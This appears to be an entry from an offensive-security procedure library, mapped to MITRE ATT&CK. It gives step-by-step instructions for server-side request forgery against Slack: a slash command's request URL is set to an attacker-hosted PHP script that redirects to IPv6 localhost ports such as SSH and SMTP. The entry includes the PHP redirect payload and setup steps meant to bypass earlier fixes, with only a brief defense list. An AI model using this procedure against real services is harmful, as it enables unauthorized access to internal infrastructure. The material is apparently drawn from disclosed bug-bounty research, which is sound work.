---
id: proc-slack-configure-ssrf
tags:
  - ssrf
  - redirect
  - ipv6
  - php
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/php-redirect-ipv6-internal]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.477Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Configure-Slash-Command-SSRF

## Summary

This procedure configures a Slack slash command to point to an attacker-controlled PHP script that redirects requests to internal IPv6 localhost addresses, enabling SSRF to bypass protections and access services like SSH.

## Description

Targeting Slack's api.slack.com, this step sets the slash command's request URL to a malicious endpoint. The PHP script on the attacker's server issues HTTP redirects to internal IPv6 addresses (e.g., [::]:22 for SSH), exploiting insufficient redirect validation. This bypasses mitigations from reports #61312 and #356765. Prerequisites: Custom app created, attacker server with PHP hosting public domain.

## Requirements

1. Active custom Slack app with slash command enabled
2. Attacker-controlled server (e.g., VPS with PHP/Apache) and public domain
3. PHP script prepared for redirects to internal ports

## Defense

Defensive measures and detection strategies:

- Validate and sanitize redirect URLs in slash command handlers
- Block IPv6 localhost resolutions in server-side requests
- Log and alert on redirects to private/internal IPs

## Objectives

1. Set up SSRF payload via slash command URL
2. Enable access to internal services through redirects
3. Confirm bypass of existing IPv6 protections

## Instructions

### Step 1: Prepare Attacker Server

**Context**: Host the PHP redirect script.

Upload index.php to your server root with content from [[commands/php-redirect-ipv6-internal]]. Test by curling https://attacker.com/index.php to verify redirect.

```php
<?php header("Location: http://[::]:22/"); ?>
```

> Curl output shows 302 redirect to http://[::]:22/.

### Step 2: Set Slash Command URL

**Context**: Link the command to the malicious endpoint.

In api.slack.com app settings, under slash commands, enter Request URL as https://attacker.com/index.php. Optionally, adjust for other ports by modifying the PHP location (e.g., [::]:25 for SMTP).

> URL field updates; no immediate errors.

### Step 3: Verify Configuration

**Context**: Ensure setup is ready for invocation.

Save preliminary changes and test direct access to the URL from a browser to confirm redirect behavior.

> Browser follows redirect; server logs show request.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/php-redirect-ipv6-internal]]

## Tools Used


## Tags

- [[ssrf]]
- [[redirect]]
- [[ipv6]]
- [[php]]
